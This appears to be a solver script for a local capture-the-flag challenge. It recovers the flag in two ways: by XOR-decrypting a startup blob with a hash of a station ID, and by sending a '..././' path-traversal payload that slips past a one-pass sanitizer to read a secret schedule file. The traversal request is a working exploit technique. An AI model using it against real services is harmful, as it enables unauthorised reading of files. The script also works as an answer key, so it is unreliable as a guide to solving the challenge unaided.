#!/usr/bin/env python3
# Dependencies: Python 3 standard library only.
# Offline mode reads service.zip; HTTP mode requires the supplied local service.

"""Solve the local Kestrel console challenge using either supported route."""

import argparse
import hashlib
import json
import re
import urllib.error
import urllib.request
import zipfile
from pathlib import Path

ARCHIVE_PATH = Path("service.zip")
FLAG_PATTERN = re.compile(r"GAIANSPACE\{[^}\r\n]+\}")


def read_service_file(member: str) -> str:
    # Read the original distributed archive without extracting it manually.
    with zipfile.ZipFile(ARCHIVE_PATH) as archive:
        return archive.read(f"service/{member}").decode("utf-8")


def extract_flag(value: str) -> str:
    match = FLAG_PATTERN.search(value)
    if match is None:
        raise ValueError("The recovered content does not contain a flag")
    return str(match.group(0))


def offline_solution() -> str:
    script = read_service_file("entrypoint.sh")
    blob_match = re.search(r'SCHED_BLOB="([0-9a-fA-F]+)"', script)
    station_match = re.search(r'get\("STATION_ID",\s*"([^"]+)"\)', script)
    if blob_match is None or station_match is None:
        raise ValueError("Could not recover startup ciphertext or station identifier")

    ciphertext = bytes.fromhex(blob_match.group(1))
    station_id = str(station_match.group(1))
    digest = hashlib.sha256(station_id.encode("utf-8")).digest()
    plaintext = bytes(
        byte ^ digest[index % len(digest)]
        for index, byte in enumerate(ciphertext)
    ).decode("utf-8")
    print("[Offline: recovered startup schedule]")
    print(plaintext.strip())
    flag = extract_flag(plaintext)
    print(f"FLAG: {flag}")
    return flag


def http_solution(base_url: str) -> str:
    app = read_service_file("app.py")
    if 'ref.replace("../", "").replace("..\\\\", "")' not in app:
        raise ValueError("The expected one-pass traversal sanitizer was not found")

    # One replacement turns '..././' into '../'. The catalog and secret
    # directories are siblings in the challenge's service container.
    malicious_ref = "..././secret/pass_schedule.txt"
    cleaned = malicious_ref.replace("../", "").replace("..\\", "")
    if cleaned != "../secret/pass_schedule.txt":
        raise ValueError("The path filter bypass did not behave as expected")

    payload = {"fragment": {"$ref": malicious_ref}}
    request = urllib.request.Request(
        url=f"{base_url.rstrip('/')}/api/catalog/import",
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            status = int(response.status)
            result = json.load(response)
    except urllib.error.URLError as error:
        raise RuntimeError(
            "Local console is unavailable; start the 903 service first"
        ) from error

    if status != 200:
        raise RuntimeError(f"Unexpected HTTP status: {status}")
    imported = result.get("imported")
    if not isinstance(imported, dict):
        raise ValueError(f"Unexpected import response: {result}")
    fragment = imported.get("fragment")
    if not isinstance(fragment, dict) or not isinstance(fragment.get("resolved"), str):
        raise ValueError(f"Restricted schedule was not returned: {result}")

    schedule = str(fragment["resolved"])
    print("[HTTP: vulnerable catalog import]")
    print(f"Submitted reference: {malicious_ref}")
    print(schedule.strip())
    flag = extract_flag(schedule)
    print(f"FLAG: {flag}")
    return flag


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--method", choices=("offline", "http", "both"), default="offline",
        help="offline does not require a running server; http sends a local request",
    )
    parser.add_argument("--url", default="http://127.0.0.1:8000")
    args = parser.parse_args()

    offline_flag = offline_solution() if args.method in ("offline", "both") else None
    http_flag = http_solution(str(args.url)) if args.method in ("http", "both") else None
    if offline_flag is not None and http_flag is not None:
        if offline_flag != http_flag:
            raise ValueError("The two solution paths recovered different flags")
        print(f"Both methods agree: {offline_flag}")


if __name__ == "__main__":
    main()
